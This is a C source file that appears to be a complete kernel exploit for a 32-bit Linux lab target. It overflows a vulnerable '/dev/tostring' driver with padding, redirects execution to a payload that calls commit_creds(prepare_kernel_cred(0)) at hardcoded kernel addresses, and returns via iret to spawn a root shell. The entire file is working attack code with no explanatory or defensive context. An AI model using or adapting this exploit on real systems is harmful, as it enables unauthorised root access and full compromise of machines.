#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>
#include <stdint.h>

struct trap_frame {
    void *eip;
    uint32_t cs;
    uint32_t eflags;
    void *esp;
    uint32_t ss;
}__attribute__((packed));

struct trap_frame tf;

void getshell(void)
{
    execl("/bin/sh", "sh", NULL);
}

void init_tf_work(void)
{
    asm(
        "pushl %cs;popl tf+4;"
        "pushfl;popl tf+8;"
        "pushl %esp;popl tf+12;"
        "pushl %ss;popl tf+16;"
    );
    tf.eip = &getshell;
    tf.esp -= 1024;
}

#define KERNCALL __attribute__((regparm(3)))
void* (*prepare_kernel_cred)(void *) KERNCALL = (void *)0xc10711f0;
void* (*commit_creds)(void *) KERNCALL = (void *)0xc1070e80;
void payload(void)
{
    commit_creds(prepare_kernel_cred(0));
    asm(
        "mov $tf, %esp;"
        "iret;"
    );
}

int main(void)
{
    char recv[255];
    char padding[9] = "AAAAAAAA";
    char eip[5];
    init_tf_work();
    int fd = open("/dev/tostring", O_RDWR);
    for (int i = 0; i < 0x40; ++i) {
        write(fd, padding, sizeof(padding)-1);
    }
    *((void**)(eip)) = &payload;
    write(fd, eip, sizeof(eip)-1);
    read(fd, recv, 255);
    return 0;
}